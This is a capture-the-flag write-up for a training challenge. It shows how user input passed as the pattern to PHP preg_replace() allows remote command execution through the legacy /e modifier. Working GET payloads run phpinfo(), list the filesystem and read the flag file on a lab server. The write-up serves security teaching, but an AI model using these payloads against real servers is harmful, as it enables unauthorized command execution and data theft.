---
Name: "Pro Replacer"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Abusing legacy PHP regex evaluation to execute commands on the server."
---

# Pro Replacer
We submit some random values and observe how the URL changes to http://sss.upb:8001/?needle=a&replacement=b&haystack=a&submit=Replace. Also an error is shown
```txt
 Warning: preg_replace(): No ending delimiter '/' found in /var/www/html/index.php on line 8
```

Let's look at some example usages of preg_replace()
```php
<?php
$string = 'April 15, 2003';
$pattern = '/(\w+) (\d+), (\d+)/i';
$replacement = '${1}1,$3';
echo preg_replace($pattern, $replacement, $string);
?>
```

The error reveals that the application is passing our needle parameter directly to PHP's preg_replace() function as the regular expression pattern

Seems like it is doing regex replacement
```
needle = abc/
replacement = X
haystack = abcdefg

GET /?needle=abc/&replacement=X&haystack=abcdefg&submit=Replace HTTP/1.1

result: Xdefg
```

Older versions of PHP support the /e (evaluate) modifier for preg_replace(). When this modifier is appended to the regular expression, the replacement string is evaluated as PHP code instead of being treated as plain text

We can verify this by using the /e modifier and calling phpinfo():
```http
.*/e 
phpinfo()
test

GET /?needle=.*%2Fe&replacement=phpinfo%28%29&haystack=test&submit=Replace
```

From this point, we can call any PHP function. The system() function executes a command on the operating system and prints its output, allowing us to enumerate the server:
```http
GET /?needle=.*%2Fe&replacement=system('ls+/+-R')&haystack=test&submit=Replace 
```

We find the flag
```txt
/var/www/html:
index.php
wRtu3ND38n8RNgez
```

Finally we read the flag
```http
GET /?needle=.*%2Fe&replacement=system('cat+wRtu3ND38n8RNgez')&haystack=test&submit=Replace HTTP/1.1
SSS{st0p_3x3cut1ng_cmds_0n_my_s3rv3r}
```

